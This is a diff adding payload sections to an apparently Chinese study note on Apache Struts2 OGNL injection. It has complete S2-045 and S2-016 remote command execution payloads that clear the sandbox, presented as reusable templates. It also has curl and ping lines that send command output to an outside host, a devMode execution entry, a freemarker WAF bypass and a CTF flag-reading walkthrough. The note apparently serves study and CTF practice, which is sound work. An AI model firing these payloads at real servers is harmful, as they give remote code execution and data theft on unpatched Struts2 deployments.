@@ -256,6 +256,137 @@ OGNL 注入最值得复盘的并不是某一条 payload，而是 Struts2 安全�
 - 异常消息链复杂
 - 容易把攻击面从“业务参数”转移到“框架异常处理”
 
+## 通用 Payload 模板
+### 1. OGNL 语法速查表
+| 语法 | 含义 | 示例 |
+|------|------|------|
+| `#变量` | 定义 / 引用上下文变量 | `#cmd='whoami'` |
+| `@类@静态方法()` | 调用任意类的静态方法 | `@java.lang.Runtime@getRuntime()` |
+| `@类@静态属性` | 访问静态属性 | `@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS` |
+| `new 全限定类名(...)` | 实例化任意对象 | `new java.lang.ProcessBuilder(#cmds)` |
+| `#context` | OGNL 上下文 Map，可摸到容器和框架内部对象 | `#context['com.opensymphony.xwork2.ActionContext.container']` |
+| `#_memberAccess` | 成员访问控制对象（沙箱开关所在地） | `#_memberAccess.allowStaticMethodAccess=true` |
+| `.()` | 链式表达式，前一段执行完继续下一段 | `(#a=1).(#b=#a+1)` |
+| `对象.方法()` | 实例方法调用 | `#process.getInputStream()` |
+| `{'a','b'}` / `#{'k':'v'}` | List / Map 字面量 | `{'cmd.exe','/c',#cmd}` |
+| `%{...}` / `${...}` | Struts2 表达式定界符（各漏洞入口的载体） | `Content-Type: %{...}.multipart/form-data` |
+| `#request` / `#session` / `#application` / `#parameters` | Struts2 预置作用域 Map | `#application['org.apache.tomcat.InstanceManager']` |
+
+### 2. 经典命令执行模板（S2-045 风格，完整可用）
+```text
+%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+```
+
+使用方式：S2-045 场景下，把整个 `%{...}` 放进 Content-Type 头（首段 `#nike='multipart/form-data'` 已维持 multipart 语义），其他入口（S2-016 等）放到对应参数里即可：
+
+```http
+POST /index.action HTTP/1.1
+Host: target:8080
+Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data
+```
+
+### 3. 各段作用拆解
+| 片段 | 作用 |
+|------|------|
+| `#nike='multipart/form-data'` | 表达式合法起点，同时让请求保持 multipart 语义进入上传解析器 |
+| `#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS` | **memberAccess 重置**：取 OGNL 默认"全允许"成员访问器备用 |
+| `#_memberAccess?(#_memberAccess=#dm):(…)` | 三目运算兼容两代版本：老版本上下文直接有 `#_memberAccess` 就替换；新版本从 `#context` 拿 container，再取 `OgnlUtil` 实例 |
+| `#ognlUtil.getExcludedPackageNames().clear()` / `getExcludedClasses().clear()` | **沙箱类清除**：清空包 / 类黑名单（默认含 `java.lang.Runtime`、`ognl.*`、`com.opensymphony.xwork2.*`） |
+| `#context.setMemberAccess(#dm)` | 正式把上下文的访问控制替换为全允许对象 |
+| `#iswin=…` + `#cmds=…` | **命令适配**：按 `os.name` 自动选择 `cmd.exe /c` 或 `/bin/bash -c` |
+| `new java.lang.ProcessBuilder(#cmds)` + `redirectErrorStream(true)` + `start()` | 创建进程并合并标准错误流，便于一次性读取全部输出 |
+| `#ros=…getOutputStream()` + `IOUtils@copy(…)` + `flush()` | **回显输出**：把进程输出写回 HTTP 响应体 |
+
+### 4. 回显受限时改用 DNS 外带
+当回显被 WAF 拦截、响应被框架吃掉或环境缺少 commons-io 依赖时，把 `#cmd` 换成外带命令：
+```text
+(#cmd='curl http://xxx.dnslog.cn')
+```
+DNSLog 平台收到解析记录即证明命令执行成功。需要带出数据时：
+```text
+(#cmd='curl http://vps:port/`whoami`')        // 命令结果拼进 URL 路径回传
+(#cmd='ping -c 1 `whoami`.xxx.dnslog.cn')     // 子域名带出数据（Linux）
+```
+
+## S2 系列漏洞速查表
+| 漏洞编号 | 入口位置 | 触发方式 | 关键 payload 片段 |
+|---------|---------|---------|------------------|
+| S2-001 | 表单字段回显 | 提交非法值，错误页回显时对 `%{...}` 二次求值 | `%{...}` |
+| S2-005 / S2-009 | 请求参数名 | 参数名被当作 OGNL 递归求值，S2-009 借参数值转移绕过 | `('\u0023_memberAccess...')(a)=x` |
+| S2-013 / S2-014 | URL / 超链接标签 | `<s:url>`/`<s:a>` 的 includeParams 对参数二次求值 | `${...}` |
+| S2-016 | `redirect:` / `action:` 参数 | 结果跳转值二次求值 | `?redirect:${...}` |
+| S2-032 | `method:` 参数前缀 | 开启动态方法调用时表达式注入 | `?method:表达式` |
+| S2-045 | Content-Type 头 | Jakarta multipart 解析异常消息二次求值 | `Content-Type: %{...}.multipart/form-data` |
+| S2-046 | 上传 filename | filename 触发异常消息二次求值（常需 `%0a` 绕过） | `filename="%{...}.jsp %0a"` |
+| S2-048 | Struts1 插件 ActionMessage | 消息文本进入 OGNL 求值 | 消息值写 `"%{...}"` |
+| S2-053 | freemarker 标签属性 | FTL 模板 `<@s.*>` 标签 value 二次求值 | `<@s.hidden name="x" value="${x}"/>` |
+| S2-057 | namespace / Action 名 | result 渲染时对 namespace 二次求值 | URL 路径注入 `${...}` |
+| S2-061 | 标签属性（id / name 等） | 属性值双重求值（S2-059 修复的绕过） | `?id=%{...}` |
+| S2-066 | 文件上传后缀校验 | 双重 Upload 参数 + 路径遍历绕过 allowedExtensions | 双 `Upload` 参数 + `../` |
+
+### S2-016 最简 payload（完整版）
+```text
+?redirect:${#context["xwork.MethodAccessor_DENY_METHOD_EXECUTION"]=false,#container=#context["com.opensymphony.xwork2.ActionContext.container"],#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class),#ognlUtil.getExcludedPackageNames().clear(),#ognlUtil.getExcludedClasses().clear(),#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS),#cmd="whoami",#iswin=(@java.lang.System@getProperty("os.name").toLowerCase().contains("win")),#cmds=(#iswin?{"cmd.exe","/c",#cmd}:{"/bin/bash","-c",#cmd}),#p=new java.lang.ProcessBuilder(#cmds),#p.redirectErrorStream(true),#process=#p.start(),#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()),@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros),#ros.flush()}
+```
+发送时注意 URL 编码：`#` → `%23`、空格 → `%20`、`+` → `%2b`、双引号 → `%22`。
+
+## 检测与工具
+### 1. 自动化工具
+- Struts2-Scan（Python）：命令行批量验证 S2-001 ~ S2-061，适合拿到一批 `.action` 资产后快速筛漏。
+- Struts2VulsScanTools（Java GUI）：单目标验证 + 利用一体，内含各编号 payload 模板，可直接执行命令拿回显，适合对单个目标深入利用。
+- 工具的本质检测思路——对每个编号发送对应探测包，依据三类信号判断是否命中：
+  - 响应延迟：payload 里塞 `sleep 5` / `@java.lang.Thread@sleep(5000)`，响应明显变慢即命中
+  - 回显内容：发算术表达式 `233*233`，看响应或报错中是否出现 `54289`
+  - 报错特征：故意构造语法错误，看报错页是否泄漏 `ognl.*` / `org.apache.struts2.*` 异常堆栈
+
+### 2. 手工判断目标是否 Struts2
+- URL 带 `.action` / `.do` 后缀（`.do` 也可能是 Spring MVC，需结合其他特征）
+- 页面源码存在 `<input type="hidden" name="struts.token" ...>` 隐藏字段（token 拦截器特征）
+- 报错页含 Struts 特征：`Struts Problem Report`、`org.apache.struts2.*` 堆栈、Struts2 错误页样式
+- devMode 开启时响应头可能出现 `Struts-Problem-Report-Id`
+
+### 3. devMode 模式判断
+开发模式开启时存在现成的 OGNL 执行入口，无需任何绕过：
+```text
+GET /index.action?debug=command&expression=%23application
+```
+- `debug=command` 加 `expression` 参数时，参数值会直接作为 OGNL 表达式执行
+- 也可用 `?debug=browser&object=...` 浏览值栈和上下文对象，收集可利用对象
+
+## CTF 案例
+以典型上传接口题为例（Vulhub `struts2/s2-045` 同款场景），完整利用流程：
+
+### 1. 识别入口
+- 题目页面 `http://target:8080/index.action`，存在文件上传功能，上传非法文件会返回报错信息
+- URL 后缀 `.action` + 报错页带 Struts 堆栈 → 确认 Struts2 应用
+- 存在上传接口且报错可控 → 重点怀疑 S2-045（Content-Type 触发）/ S2-046（filename 触发）
+
+### 2. 选编号并验证
+入口特征是"上传异常 + Content-Type 可控"，优先试 S2-045，先发算术回显探测：
+```http
+POST /index.action HTTP/1.1
+Host: target:8080
+Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
+```
+响应头多出 `vulhub: 54289` → 漏洞确认。若不命中，再换 S2-046 的 filename 注入。
+
+### 3. payload 执行
+换用「通用 Payload 模板」中的完整命令执行模板，把 `#cmd` 改成 `ls /`（Windows 环境用 `dir`），响应体直接回显目录列表。
+
+### 4. flag 读取
+```text
+(#cmd='cat /flag')            // Linux 常见路径
+(#cmd='type c:\\flag.txt')    // Windows 场景
+```
+- 看不到结果时排查：
+  - flag 不在根目录 → `(#cmd='find / -name "flag*"')`
+  - 结果含特殊字符被截断 → `(#cmd='cat /flag | base64')` 回读
+- 无回显场景 → 改 `(#cmd='curl http://xxx.dnslog.cn')` 外带确认，或直接反弹 shell 后交互式找 flag
+- WAF 拦截 `ProcessBuilder` / `Runtime` 关键字时，换 freemarker 执行类绕过：
+```text
+(#instancemanager=#application['org.apache.tomcat.InstanceManager']).(#execute=#instancemanager.newInstance('freemarker.template.utility.Execute')).(#execute.exec('cat /flag'))
+```
+
 ## 学习和复盘建议
 如果要系统掌握 OGNL 注入，建议按这个顺序：
 1. 先理解 `ValueStack` 和 `ActionContext`
@@ -290,3 +421,7 @@ OGNL 绕过空间很大，只做关键字过滤并不可靠。
 ## Reference
 - [Java 表达式注入](https://y4er.com/post/java-expression-injection/)
 - [Struts2 OGNL 表达式注入相关资料检索建议](https://struts.apache.org/security/)
+- [Apache Struts 官方安全公告（Security Bulletins 索引）](https://cwiki.apache.org/confluence/display/WW/Security+Bulletins)
+- [S2-061 官方公告（CVE-2020-17530）](https://cwiki.apache.org/confluence/display/WW/S2-061)
+- [GHSL-2020-205: S2-061 标签属性双重求值分析（GitHub Security Lab）](https://securitylab.github.com/advisories/GHSL-2020-205-double-eval-dynattrs-struts2/)
+- [Vulhub Struts2 全系列靶场环境](https://github.com/vulhub/vulhub/tree/master/struts2)
